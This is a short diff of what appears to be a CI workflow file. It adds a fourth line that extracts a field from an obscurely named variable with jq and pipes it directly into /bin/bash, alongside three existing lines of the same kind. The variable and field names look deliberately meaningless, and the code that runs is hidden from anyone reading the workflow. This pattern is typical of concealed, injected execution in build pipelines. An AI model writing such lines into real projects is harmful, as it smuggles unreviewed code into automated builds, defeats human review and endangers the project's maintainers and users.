@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$jkboh3500" | jq -r .gtm6 | /bin/bash
           echo $nwk0798 | jq -r .amf24 | /bin/bash
           echo $nojs7 | jq -r .ocb13 | /bin/bash
+          echo $t449 | jq -r .xh7 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
